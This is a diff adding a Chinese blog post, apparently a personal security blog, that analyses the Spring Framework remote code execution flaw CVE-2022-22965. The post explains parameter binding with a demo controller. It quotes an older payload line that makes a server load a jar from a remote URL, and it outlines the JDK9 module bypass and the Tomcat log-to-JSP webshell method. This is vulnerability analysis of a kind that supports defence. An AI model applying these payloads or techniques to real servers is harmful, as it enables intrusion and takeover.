@@ -18486,4 +18486,80 @@ docker0         8000.0242f067143f       no              veth382d563
         <tag>TUN</tag>
       </tags>
   </entry>
+  <entry>
+    <title>[CVE-2022-22965]SpringRCE分析</title>
+    <url>/%5BCVE-2022-22965%5DSpringRCE%E5%A4%8D%E7%8E%B0.html</url>
+    <content><![CDATA[<h1 id="CVE-2022-22965-SpringRCE分析"><a href="#CVE-2022-22965-SpringRCE分析" class="headerlink" title="[CVE-2022-22965]SpringRCE分析"></a>[CVE-2022-22965]SpringRCE分析</h1><p>毕设突然通知中期，加上最近又有面试，大概有两个星期没有水文章了。复习面试的时候怕问java，就抽空调了一下最新的spring究极rce。然后现在水成文章</p>
+<p>这个洞在刚出来的时候吹的很牛逼，什么核弹级，和log4j那个一样牛逼。那个时候就提到了只能对tomcat部署的spring进行利用，还要jdk9以上。听起来就不是很牛逼，现在再try了一下之后感觉更不nb了，真是不知道在吹什么</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>漏洞原理网上的文章有一大堆，基础原理看的话还有java bean一类的基础知识。</p>
+<p>但其实简单的说就是spring框架的路由处参数可以不是字符串，而是一个java bean对象。java bean可以简单的理解为一个对应属性存在getter，setter的类，然后请求的参数如果是这个bean的属性的话，就把这个属性给赋值上去</p>
+<p>（一开始调试了半天这个功能，发现调了半天也没发现什么有意思的东西，反正就是发现这个东西能支持递归赋值，比如aa.bb.cc.dd&#x3D;ee，如果对于目标类存在这么多层套娃的话就能把这个几层下面的对象的值赋值成ee，最后的结论是知道这个功能就行，调试没什么用。。。）</p>
+<p>写一个测试代码，就先用spring boot测试，这个功能被称为<code>参数绑定</code>，spring核心包中自带。所以是个spring就支持这个功能</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>springdemo<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span>Controller<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>RequestMapping<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>ResponseBody<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletRequest<span class="token punctuation">;</span>
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletResponse<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ByteArrayInputStream<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span>
+
+
+<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{</span>
+    <span class="token keyword">private</span> String name<span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token annotation punctuation">@Controller</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token punctuation">{</span>
+
+    <span class="token annotation punctuation">@ResponseBody</span>
+    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/test"</span><span class="token punctuation">)</span>
+    <span class="token keyword">public</span> String <span class="token function">test</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+
+    <span class="token annotation punctuation">@ResponseBody</span>
+    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
+    <span class="token keyword">public</span> String <span class="token function">demo</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token string">"Hello world"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>如果访问<code>/test?name=aaa</code>的话user的name就会被参数绑定功能设置为aaa</p>
+<p>而如何获取到java bean的所有getter和setter呢？这里使用了java自带的一个玄幻操作<code>java.beans.PropertyDescriptor</code>，能够自动的获取到对应的这些方法。而所有的对象都继承自object，object存在一个class属性，也能够被PropertyDescriptor给找到。也就是说可以访问到一个class实例。</p>
+<p>然后再从class实例往下摸。能够摸到classloader，而接下来的rce就是通过classloader向下寻找，找到存在setter且值为字符串时的攻击手法</p>
+<p>这个参数绑定的洞其实不是第一次出现，在十多年前就有一个类似的rce。可以看看这个分析文章<br><a href="http://rui0.cn/archives/1158">SpringMVC框架任意代码执行漏洞(CVE-2010-1622)分析</a><br>当时的payload是直接通过修改classloader的url加载远程jar包实现的rce<br><code>class.classLoader.URLs[0]=jar:http://127.0.0.1:8000/sp-exp.jar!/</code><br>然后等待渲染时触发。需要之前没有渲染过对应页面（有点鸡肋）</p>
+<p>而现在该方法已经失效，即使在jdk9的全新操作下绕过了spring的防御，但tomcat也做了相应的防范。tomcat在6.0.28后将获取url的方式由引用换成了浅拷贝，保证了即使classloader的url遭到修改，tomcat处的不会同步变化</p>
+<p>spring做了个简单的关键字过滤来防，这也是jdk9能够绕过的原因</p>
+<p>判断条件为</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>Class<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>beanClass<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token string">"classloader"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>pd<span class="token punctuation">.</span>getName<span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre>
+<p>即不能访问class类的classloader属性</p>
+<p>而这次jdk9的绕过就是因为jdk9出了一个叫做module的操作。简单的看了一下，类似于nodejs的module，可以选择export哪些类，没有被export的类即使是public的也不能被访问（好像可以反射强行访问）。然后要export操作的话需要进行对应的配置文件的修改</p>
+<p>而在module这种导入导出的情况下，也利用到了classloader，且module同样在class下<br>因此，使用class.module.classloader即可完成对spring的绕过，但十年前的那个load jar的操作也已经被tomcat修了，因此还需要另找突破口</p>
+<p>这里要考虑的是为什么利用条件还加了一个tomcat部署。因为spring本身自带参数绑定，那么就一定是需要tomcat来提供一个rce的点</p>
+<p>现在公开的poc为通过tomcat日志的方法写入jsp来getshell。具体网上找poc，懒得细讲。然后简单的测了一下为什么写日志一定要tomcat。。。结论就是只有在tomcat环境下，class.module.classloader才能访问到对应的<code>org.apache.catalina.loader.ParallelWebappClassLoader</code>，然后调用getResource才能拿到对应的环境上下文。配置日志路径内容和后缀，完成写入</p>
+<p>说起来对jsp的解析本身也是需要额外支持的，所以spring boot就算能被写日志也不会自带jsp的解析，所以攻击条件的tomcat是绝对必须的</p>
+<p>日志本身%具有特殊含义，但可以直接利用这个特殊含义在header等位置放置payload，还能绕过waf，无敌</p>
+<p>修复方案也很简单，spring直接当bean是class时，只允许修改name属性。<br>tomcat也和十年前一样更新了一波，他们直接说getResource这个方法本身就被废弃了，我直接把他改成return null。。。绝对防御</p>
+]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
 </search>
